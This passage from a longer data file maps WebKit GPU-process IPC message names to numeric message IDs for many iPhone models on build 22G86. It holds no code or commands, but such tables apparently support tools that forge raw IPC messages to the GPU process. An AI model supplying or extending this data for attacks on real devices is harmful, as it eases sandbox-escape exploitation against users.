      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,5_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,6_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,7_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,8_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,2_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,3_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,4_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,5_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone16,1_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone16,2_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,1_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,2_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,3_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
